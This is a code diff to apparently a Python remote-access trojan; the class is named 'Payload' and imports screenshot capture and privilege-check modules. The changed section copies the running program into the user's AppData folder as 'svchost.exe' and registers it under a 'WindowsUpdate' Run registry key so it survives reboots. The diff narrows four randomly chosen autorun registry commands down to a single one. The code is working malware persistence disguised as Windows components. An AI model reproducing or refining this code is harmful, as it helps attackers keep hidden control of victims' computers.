@@ -1,4 +1,4 @@
-import requests, base64, os, time, subprocess, hashlib, re, shutil, random, sys, webbrowser
+import requests, base64, os, time, subprocess, hashlib, re, shutil, sys, webbrowser
 import ctypes   #To find user privileges i.e. User/Administrator
 import tempfile # Used to find temp directory pathimport webbrowser  # To open Attacker Website in Browser 
 from mss import mss   # To capture screenshot
@@ -37,14 +37,10 @@ class Payload:
         evil_file_location = os.environ["appdata"] + "\\svchost.exe"
         persistence_registry_name = "WindowsUpdate"
         
-        persistenceCMD_1 = f"REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /V \"{persistence_registry_name}\" /t REG_SZ /F /D \"{evil_file_location}\""
-        persistenceCMD_2 = f"REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices /V \"{persistence_registry_name}\" /t REG_SZ /F /D \"{evil_file_location}\""
-        persistenceCMD_3 = f"REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /V \"{persistence_registry_name}\" /t REG_SZ /F /D \"{evil_file_location}\""
-        persistenceCMD_4 = f"REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run /V \"{persistence_registry_name}\" /t REG_SZ /F /D \"{evil_file_location}\""
-        persistenceCMD_List = [persistenceCMD_1, persistenceCMD_2, persistenceCMD_3, persistenceCMD_4]
+        persistenceCMD = f"REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /V \"{persistence_registry_name}\" /t REG_SZ /F /D \"{evil_file_location}\""
         
         if not os.path.exists(evil_file_location):
-            cmd = random.choice(persistenceCMD_List)
+            cmd = persistenceCMD
             time.sleep(time_persistent)
             shutil.copyfile(sys.executable, evil_file_location)
             subprocess.call(cmd, shell=True)
